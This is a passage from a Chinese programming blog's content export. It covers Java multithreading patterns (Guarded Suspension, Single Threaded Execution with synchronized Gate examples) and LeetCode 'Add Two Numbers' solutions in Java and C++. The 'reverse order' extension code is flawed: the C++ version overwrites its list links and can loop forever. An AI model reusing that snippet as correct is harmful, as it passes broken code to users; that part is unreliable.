&#123;</span><br><span class="line">				Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">			&#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">				e.printStackTrace();</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="ServerThread类"><a href="#ServerThread类" class="headerlink" title="ServerThread类"></a>ServerThread类</h3><p>ServerThread用于表示接受请求的线程。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ServerThread</span> <span class="keyword">extends</span> <span class="title">Thread</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">final</span> Random random;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">final</span> RequestQueue requestQueue;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">ServerThread</span><span class="params">(RequestQueue requestQueue, String name, <span class="keyword">long</span> seed)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">super</span>(name);</span><br><span class="line">		<span class="keyword">this</span>.requestQueue = requestQueue;</span><br><span class="line">		<span class="keyword">this</span>.random = <span class="keyword">new</span> Random(seed);</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> index = <span class="number">0</span>;index &lt; <span class="number">10000</span>; index++) &#123;</span><br><span class="line">			Request request = requestQueue.getRequest();</span><br><span class="line">			System.out.println(Thread.currentThread().getName() + <span class="string">" handles "</span> + request);</span><br><span class="line">			<span class="keyword">try</span> &#123;</span><br><span class="line">				Thread.sleep(<span class="number">1000</span>);</span><br><span class="line">			&#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">				e.printStackTrace();</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Main类"><a href="#Main类" class="headerlink" title="Main类"></a>Main类</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		RequestQueue requestQueue = <span class="keyword">new</span> RequestQueue();</span><br><span class="line">		<span class="keyword">new</span> ClientThread(requestQueue, <span class="string">"Alice"</span>, <span class="number">3141592L</span>).start();</span><br><span class="line">		<span class="keyword">new</span> ServerThread(requestQueue, <span class="string">"Bobby"</span>, <span class="number">6535897L</span>).start();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="运行结果"><a href="#运行结果" class="headerlink" title="运行结果"></a>运行结果</h3><p><img src="https://huhansi.github.io/images/A.png" alt="执行结果"></p>
]]></content>
      <categories>
        <category>java多线程设计模式</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>多线程</tag>
        <tag>设计模式</tag>
        <tag>Guarded Suspension 模式</tag>
      </tags>
  </entry>
  <entry>
    <title>Single Threaded Execution模式</title>
    <url>/2018/09/02/Java/%E5%A4%9A%E7%BA%BF%E7%A8%8B%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F/1.Single%20Threaded%20Execution%E6%A8%A1%E5%BC%8F/</url>
    <content><![CDATA[<h1 id="Single-Threaded-Execution模式"><a href="#Single-Threaded-Execution模式" class="headerlink" title="Single Threaded Execution模式"></a>Single Threaded Execution模式</h1><p>所谓Single Threaded Execution模式，意即“以一个线程执行”。就像独木桥同一时间只允许一个人通行一样，该模式用于设置限制，以确保同一时间内只能让一个线程执行处理。<br>Single Threaded Execution 有时候又被称作为临界区或临界域。Single Threaded Execution这个名称侧重于执行处理的线程，而临界区或临界域的名称侧重于执行范围。</p>
<h2 id="不使用Single-Threaded-Execution模式的程序"><a href="#不使用Single-Threaded-Execution模式的程序" class="headerlink" title="不使用Single Threaded Execution模式的程序"></a>不使用Single Threaded Execution模式的程序</h2><h3 id="类的一览表"><a href="#类的一览表" class="headerlink" title="类的一览表"></a>类的一览表</h3><table>
<thead>
<tr>
<th>名字</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>Main</td>
<td>创建门，并让三个人不断通过的类</td>
</tr>
<tr>
<td>Gate</td>
<td>表示门的类。 它会在人们通过门时记录其姓名与出生地</td>
</tr>
<tr>
<td>UserThread</td>
<td>表示人的类。人们将不断地通过门</td>
</tr>
<tr>
<td>### Main类</td>
<td></td>
</tr>
<tr>
<td>Main类将创建一个门，并让三个人不断地通过。首先Main类会创建Gate类的实例，并将该实例作为参数传递个UserThread类的构造函数。</td>
<td></td>
</tr>
<tr>
<td><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">		Gate gate = <span class="keyword">new</span> Gate();</span><br><span class="line">		<span class="keyword">new</span> UserThread(gate, <span class="string">"Alice"</span>, <span class="string">"Alaska"</span>).start();</span><br><span class="line">		<span class="keyword">new</span> UserThread(gate, <span class="string">"Bob"</span>, <span class="string">"Brazil"</span>).start();</span><br><span class="line">		<span class="keyword">new</span> UserThread(gate, <span class="string">"Chris"</span>, <span class="string">"Canada"</span>).start();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></td>
<td></td>
</tr>
<tr>
<td>### 非线程安全的Gate类</td>
<td></td>
</tr>
<tr>
<td>Gate类表示人通过的门。</td>
<td></td>
</tr>
<tr>
<td><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Gate</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">int</span> counter = <span class="number">0</span>;    <span class="comment">// 到目前为止通过的人数</span></span><br><span class="line">	</span><br><span class="line">	<span class="keyword">private</span> String name = <span class="string">"nobody"</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">private</span> String address = <span class="string">"nowhere"</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">pass</span><span class="params">(String name, String address)</span> </span>&#123;    <span class="comment">// 通过门，将通过人数+1，赋值人名和地址</span></span><br><span class="line">		<span class="keyword">this</span>.counter++;</span><br><span class="line">		<span class="keyword">this</span>.name = name;</span><br><span class="line">		<span class="keyword">this</span>.address = address;</span><br><span class="line">		check();</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">"No."</span> + counter + <span class="string">": "</span> + name + <span class="string">", "</span> + address;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">check</span><span class="params">()</span> </span>&#123;    <span class="comment">// 检查当前门的状态</span></span><br><span class="line">		<span class="keyword">if</span> (name.charAt(<span class="number">0</span>) != address.charAt(<span class="number">0</span>)) &#123;</span><br><span class="line">			System.out.println(<span class="string">"******** BROKEN ********"</span> + toString());</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></td>
<td></td>
</tr>
</tbody></table>
<h3 id="UserThread类"><a href="#UserThread类" class="headerlink" title="UserThread类"></a>UserThread类</h3><p>UserThread表示不断通过门的人</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">UserThread</span> <span class="keyword">extends</span> <span class="title">Thread</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">final</span> Gate gate;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">final</span> String myName;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">final</span> String myAddress;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="title">UserThread</span><span class="params">(Gate gate, String myName, String myAddress)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">this</span>.gate = gate;</span><br><span class="line">		<span class="keyword">this</span>.myName = myName;</span><br><span class="line">		<span class="keyword">this</span>.myAddress = myAddress;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		System.out.println(myName + <span class="string">" begin"</span>);</span><br><span class="line">		<span class="keyword">while</span>(<span class="keyword">true</span>) &#123;</span><br><span class="line">			gate.pass(myName, myAddress);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://huhansi.github.io/images/1.%E9%9D%9E%E7%BA%BF%E7%A8%8B%E5%AE%89%E5%85%A8Gate%E7%B1%BB.PNG" alt="非线程安全类执行结果"></p>
<h3 id="为什么会出错"><a href="#为什么会出错" class="headerlink" title="为什么会出错"></a>为什么会出错</h3><p>因为pass方法会被多个线程执行，此处是3个。pass方法包含下面四条语句：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">this</span>.counter++</span><br><span class="line"><span class="keyword">this</span>.name = name</span><br><span class="line"><span class="keyword">this</span>.address = address</span><br><span class="line">check()</span><br></pre></td></tr></table></figure>
<p>这里以两个线程举两个错误的例子。<br><strong>线程Alice和线程Bobby执行pass方法的情形1</strong></p>
<table>
<thead>
<tr>
<th>线程Alice</th>
<th>线程Bob</th>
<th>this.name的值</th>
<th>this.address的值</th>
</tr>
</thead>
<tbody><tr>
<td>this.counter++</td>
<td>this.counter++</td>
<td>（之前的值）</td>
<td>（之前的值）</td>
</tr>
<tr>
<td></td>
<td></td>
<td>“Bobby”</td>
<td>（之前的值）</td>
</tr>
<tr>
<td>this.name = name</td>
<td></td>
<td>“Alice”</td>
<td>（之前的值）</td>
</tr>
<tr>
<td>this.address = address</td>
<td></td>
<td>“Alice”</td>
<td>“Alaska”</td>
</tr>
<tr>
<td></td>
<td>this.address = address</td>
<td>“Alice”</td>
<td>“Brazil”</td>
</tr>
<tr>
<td>check()</td>
<td>check()</td>
<td>“Alice”</td>
<td>“Brazil”</td>
</tr>
<tr>
<td></td>
<td></td>
<td><code>***** BROKEN *****</code></td>
<td></td>
</tr>
<tr>
<td><strong>线程Alice和线程Bobby执行pass方法的情形2</strong></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>线程Alice</th>
<th>线程Bob</th>
<th>this.name的值</th>
<th>this.address的值</th>
</tr>
</thead>
<tbody><tr>
<td>this.counter++</td>
<td>this.counter++</td>
<td>（之前的值）</td>
<td>（之前的值）</td>
</tr>
<tr>
<td>this.name = name</td>
<td></td>
<td>“Alice”</td>
<td>（之前的值）</td>
</tr>
<tr>
<td></td>
<td>this.name = name</td>
<td>“Bobby”</td>
<td>（之前的值）</td>
</tr>
<tr>
<td></td>
<td>this.address = address</td>
<td>“Bobby”</td>
<td>“Brazil”</td>
</tr>
<tr>
<td>this.address = address</td>
<td></td>
<td>“Bobby”</td>
<td>“Alaska”</td>
</tr>
<tr>
<td>check()</td>
<td>check()</td>
<td>“Bobby”</td>
<td>“Brazil”</td>
</tr>
<tr>
<td></td>
<td></td>
<td><code>***** BROKEN *****</code></td>
<td></td>
</tr>
</tbody></table>
<h2 id="使用Single-Threaded-Execution模式的程序"><a href="#使用Single-Threaded-Execution模式的程序" class="headerlink" title="使用Single Threaded Execution模式的程序"></a>使用Single Threaded Execution模式的程序</h2><p>这边只要将Gate类改为线程安全的类即可，其他的类不需要修改。</p>
<h3 id="线程安全的Gate类"><a href="#线程安全的Gate类" class="headerlink" title="线程安全的Gate类"></a>线程安全的Gate类</h3><p>分别有两处修改，在pass和toString方法签名中加入了synchronized关键字，这样一来Gate类就变成了线程安全的类。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Gate</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">int</span> counter = <span class="number">0</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">private</span> String name = <span class="string">"nobody"</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">private</span> String address = <span class="string">"nowhere"</span>;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">pass</span><span class="params">(String name, String address)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">this</span>.counter++;</span><br><span class="line">		<span class="keyword">this</span>.name = name;</span><br><span class="line">		<span class="keyword">this</span>.address = address;</span><br><span class="line">		check();</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">synchronized</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">"No."</span> + counter + <span class="string">": "</span> + name + <span class="string">", "</span> + address;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">check</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (name.charAt(<span class="number">0</span>) != address.charAt(<span class="number">0</span>)) &#123;</span><br><span class="line">			System.out.println(<span class="string">"******** BROKEN ********"</span> + toString());</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>如图所示：</strong> 无论执行多久，都不会再有其他输出。</p>
<p><img src="https://huhansi.github.io/images/2.%E7%BA%BF%E7%A8%8B%E5%AE%89%E5%85%A8Gate%E7%B1%BB.PNG" alt="线程安全类执行结果"></p>
<p><strong>线程Alice和线程Bobby执行pass方法的情形1</strong></p>
<table>
<thead>
<tr>
<th>线程Alice</th>
<th>线程Bob</th>
<th>this.name的值</th>
<th>this.address的值</th>
</tr>
</thead>
<tbody><tr>
<td>获取锁</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>this.counter++</td>
<td></td>
<td>（之前的值）</td>
<td>（之前的值）</td>
</tr>
<tr>
<td>this.name = name</td>
<td></td>
<td>“Alice”</td>
<td>（之前的值）</td>
</tr>
<tr>
<td>this.address = address</td>
<td></td>
<td>“Alice”</td>
<td>“Alaska”</td>
</tr>
<tr>
<td>check()</td>
<td></td>
<td>“Alice”</td>
<td>“Alaska”</td>
</tr>
<tr>
<td>释放锁</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td></td>
<td>获取锁</td>
<td></td>
<td></td>
</tr>
<tr>
<td></td>
<td>this.count++</td>
<td>“Alice”</td>
<td>“Alaska”</td>
</tr>
<tr>
<td></td>
<td>this.name = name</td>
<td>“Bobby”</td>
<td>“Alaska”</td>
</tr>
<tr>
<td></td>
<td>this.address = address</td>
<td>“Bobby”</td>
<td>“Brazil”</td>
</tr>
<tr>
<td></td>
<td>check()</td>
<td>“Bobby”</td>
<td>“Brazil”</td>
</tr>
<tr>
<td></td>
<td>释放锁</td>
<td></td>
<td></td>
</tr>
</tbody></table>
<p><strong>线程Alice和线程Bobby执行pass方法的情形2</strong></p>
<table>
<thead>
<tr>
<th>线程Alice</th>
<th>线程Bob</th>
<th>this.name的值</th>
<th>this.address的值</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td>获取锁</td>
<td></td>
<td></td>
</tr>
<tr>
<td></td>
<td>this.counter++</td>
<td>（之前的值）</td>
<td>（之前的值）</td>
</tr>
<tr>
<td></td>
<td>this.name = name</td>
<td>“Bobby”</td>
<td>（之前的值）</td>
</tr>
<tr>
<td></td>
<td>this.address = address</td>
<td>“Bobby”</td>
<td>“Brazil”</td>
</tr>
<tr>
<td></td>
<td>check()</td>
<td>“Bob”</td>
<td>“Brazil”</td>
</tr>
<tr>
<td></td>
<td>释放锁</td>
<td></td>
<td></td>
</tr>
<tr>
<td>获取锁</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>this.count++</td>
<td></td>
<td>“Bobby”</td>
<td>“Brazil”</td>
</tr>
<tr>
<td>this.name = name</td>
<td></td>
<td>“Alice”</td>
<td>“Brazil”</td>
</tr>
<tr>
<td>this.address = address</td>
<td></td>
<td>“Alice”</td>
<td>“Alaska”</td>
</tr>
<tr>
<td>check()</td>
<td></td>
<td>“Alice”</td>
<td>“Alaska”</td>
</tr>
<tr>
<td>释放锁</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>## 参考</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>《图解Java多线程设计模式》</td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>java多线程设计模式</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>多线程</tag>
        <tag>Single Threaded Execution模式</tag>
        <tag>设计模式</tag>
      </tags>
  </entry>
  <entry>
    <title>2. 两数相加</title>
    <url>/2018/08/30/LeetCode/leetcode-000002-%E4%B8%A4%E6%95%B0%E7%9B%B8%E5%8A%A0/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定两个非空链表来表示两个非负整数。位数按照逆序方式存储，它们的每个节点只存储单个数字。将两数相加返回一个新的链表。</p>
<p>你可以假设除了数字 0 之外，这两个数字都不会以零开头。</p>
<h3 id="示例："><a href="#示例：" class="headerlink" title="示例："></a>示例：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">输入：(2 -&gt; 4 -&gt; 3) + (5 -&gt; 6 -&gt; 4)</span><br><span class="line">输出：7 -&gt; 0 -&gt; 8</span><br><span class="line">原因：342 + 465 &#x3D; 807</span><br></pre></td></tr></table></figure>
<h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><h3 id="解法一：模拟竖式加法"><a href="#解法一：模拟竖式加法" class="headerlink" title="解法一：模拟竖式加法"></a>解法一：模拟竖式加法</h3><p>竖式加法就是从最低位一位一位往最高位加，如果有进位的话，再加上这个进位。此处模拟这个过程即可。不过需要注意的，<strong>两个列表未必是长度相同的</strong>。</p>
<h4 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * public class ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode next;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) &#123; val = x; &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> ListNode <span class="title">addTwoNumbers</span><span class="params">(ListNode l1, ListNode l2)</span> </span>&#123;</span><br><span class="line">		ListNode tmp = <span class="keyword">null</span>;</span><br><span class="line">	    ListNode result = <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">	    <span class="keyword">int</span> carry = <span class="number">0</span>;</span><br><span class="line">	    <span class="keyword">while</span> (l1 != <span class="keyword">null</span> || l2 != <span class="keyword">null</span> || carry != <span class="number">0</span>) &#123;</span><br><span class="line">	        <span class="keyword">int</span> sum = (l1 == <span class="keyword">null</span> ? <span class="number">0</span> : l1.val) + (l2 == <span class="keyword">null</span> ? <span class="number">0</span> : l2.val) + carry;</span><br><span class="line">	        carry = sum / <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">	        ListNode node = <span class="keyword">new</span> ListNode(sum % <span class="number">10</span>);</span><br><span class="line">	        <span class="keyword">if</span> (tmp == <span class="keyword">null</span>) &#123;</span><br><span class="line">	            tmp = node;</span><br><span class="line">	            result = tmp;</span><br><span class="line">	        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	            tmp.next = node;</span><br><span class="line">	            tmp = tmp.next;</span><br><span class="line">	        &#125;</span><br><span class="line"></span><br><span class="line">	        l1 = l1 == <span class="keyword">null</span> ? <span class="keyword">null</span> : l1.next;</span><br><span class="line">	        l2 = l2 == <span class="keyword">null</span> ? <span class="keyword">null</span> : l2.next;</span><br><span class="line">	    &#125;</span><br><span class="line"></span><br><span class="line">	    <span class="keyword">return</span> result;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="CPP"><a href="#CPP" class="headerlink" title="CPP"></a>CPP</h4><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode *next;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) : val(x), next(NULL) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode *<span class="title">addTwoNumbers</span><span class="params">(ListNode *l1, ListNode *l2)</span> </span>&#123;</span><br><span class="line">        ListNode* result = <span class="keyword">new</span> ListNode(<span class="number">-1</span>);</span><br><span class="line">        ListNode* pre = result;</span><br><span class="line">        ListNode *pa = l1, *pb = l2;</span><br><span class="line">        <span class="keyword">int</span> carry =<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(pa!=<span class="literal">NULL</span> || pb!=<span class="literal">NULL</span>)&#123;</span><br><span class="line">            <span class="keyword">int</span> av = pa == <span class="literal">NULL</span>? <span class="number">0</span>:pa-&gt;val;</span><br><span class="line">            <span class="keyword">int</span> bv = pb == <span class="literal">NULL</span>? <span class="number">0</span>:pb-&gt;val;</span><br><span class="line">            ListNode* node = <span class="keyword">new</span> ListNode((av+bv+carry)%<span class="number">10</span>);</span><br><span class="line">            carry = (av+bv+carry)/<span class="number">10</span>;</span><br><span class="line">            pre-&gt;next = node;</span><br><span class="line">            pre = pre-&gt;next;</span><br><span class="line">            pa = pa==<span class="literal">NULL</span>? <span class="literal">NULL</span>:pa-&gt;next;</span><br><span class="line">            pb = pb==<span class="literal">NULL</span>? <span class="literal">NULL</span>:pb-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(carry &gt;<span class="number">0</span>)&#123;</span><br><span class="line">            pre-&gt;next = <span class="keyword">new</span> ListNode(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        pre = result-&gt;next;</span><br><span class="line">        <span class="keyword">delete</span> result;</span><br><span class="line">        <span class="keyword">return</span> pre;</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<h2 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h2><p>如果，保存的位顺序是反的呢？</p>
<p>比如： 342+465=807</p>
<p>(3→4→2)+(4→6→5)=8→0→7</p>
<h3 id="解法一："><a href="#解法一：" class="headerlink" title="解法一："></a>解法一：</h3><p>按照顺序每位相加。完成之后，用两个指针（一个保存头指针p1，一个保存头指针后一个p2），从头开始遍历列表，判断p2是否大于等于10，是的话，p1对应的值，加一。然后顺移一位，直到最后。</p>
<h4 id="JAVA-1"><a href="#JAVA-1" class="headerlink" title="JAVA"></a>JAVA</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ListNode <span class="title">addTwoNumbersReverse</span><span class="params">(ListNode l1, ListNode l2)</span> </span>&#123;</span><br><span class="line">		ListNode result = <span class="keyword">new</span> ListNode(<span class="number">0</span>);</span><br><span class="line">		<span class="keyword">while</span> (<span class="keyword">null</span> != l1 || <span class="keyword">null</span> != l2) &#123;</span><br><span class="line">			ListNode node = <span class="keyword">new</span> ListNode(<span class="number">0</span>);</span><br><span class="line">			<span class="keyword">if</span> (<span class="keyword">null</span> == l1) &#123;</span><br><span class="line">				node.val = l2.val;</span><br><span class="line">			&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">null</span> == l2) &#123;</span><br><span class="line">				node.val = l1.val;</span><br><span class="line">			&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">				node.val = l1.val + l2.val;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (<span class="keyword">null</span> != l1) &#123;</span><br><span class="line">				l1 = l1.next;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (<span class="keyword">null</span> != l2) &#123;</span><br><span class="line">				l2 = l2.next;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			ListNode p1 = result;</span><br><span class="line">			ListNode p2 = result.next;</span><br><span class="line">			<span class="keyword">while</span> (<span class="keyword">null</span> != p2) &#123;</span><br><span class="line">				<span class="keyword">if</span> (p2.val &gt;= <span class="number">10</span>) &#123;</span><br><span class="line">					p1.val += <span class="number">1</span>;</span><br><span class="line">					p2.val -= <span class="number">10</span>;</span><br><span class="line">				&#125;</span><br><span class="line">				p1 = p2;</span><br><span class="line">				p2 = p2.next;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (result.val == <span class="number">0</span>) &#123;</span><br><span class="line">				result = result.next;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> result;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<h4 id="CPP-1"><a href="#CPP-1" class="headerlink" title="CPP"></a>CPP</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">ListNode* <span class="title">addTwoNumbersReverse</span><span class="params">(ListNode* l1, ListNode* l2)</span> </span>&#123;</span><br><span class="line">        ListNode* result = <span class="keyword">new</span> ListNode(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">while</span> (l1 || l2) &#123;</span><br><span class="line">            ListNode* node = <span class="keyword">new</span> ListNode(<span class="number">0</span>);</span><br><span class="line">            <span class="keyword">if</span> (<span class="literal">nullptr</span> == l1) &#123;</span><br><span class="line">                node-&gt;val = l2-&gt;val;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="literal">nullptr</span> == l2) &#123;</span><br><span class="line">                node-&gt;val = l1-&gt;val;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                node-&gt;val = l1-&gt;val + l2-&gt;val;</span><br><span class="line">            &#125;</span><br><span class="line">            result-&gt;next = node;</span><br><span class="line">            <span class="keyword">if</span> (l1) &#123;</span><br><span class="line">                l1 = l1-&gt;next;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (l2) &#123;</span><br><span class="line">                l2 = l2-&gt;next;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ListNode* p1 = result;</span><br><span class="line">        ListNode* p2 = result-&gt;next; 	</span><br><span class="line">        <span class="keyword">while</span> (p2) &#123;</span><br><span class="line">            <span class="keyword">if</span> (p2-&gt;val &gt;= <span class="number">10</span>) &#123;</span><br><span class="line">                p1-&gt;val += <span class="number">1</span>;</span><br><span class="line">                p2-&gt;val -= <span class="number">10</span>;</span><br><span class="line">                p1 = p2;</span><br><span class="line">                p2 = p2-&gt;next;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 如果都没有进位，去除前导0</span></span><br><span class="line">        <span class="keyword">if</span> (!result-&gt;val) &#123;</span><br><span class="line">            result = result-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>4. 两个排序数组的中位数</title>
    <url>/2018/08/30/LeetCode/leetcode-000004-%E4%B8%A4%E4%B8%AA%E6%8E%92%E5%BA%8F%E6%95%B0%E7%BB%84%E7%9A%84%E4%B8%AD%E4%BD%8D%E6%95%B0/</url>
    <content><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定两个大小为 m 和 n 的有序数组 nums1 和 nums2 。</p>
<p>请找出这两个有序数组的中位数。要求算法的时间复杂度为 O(log (m+n)) 。</p>
<p>你可以假设 nums1 和 nums2 不同时为空。<br><strong>示例1：</strong></p>
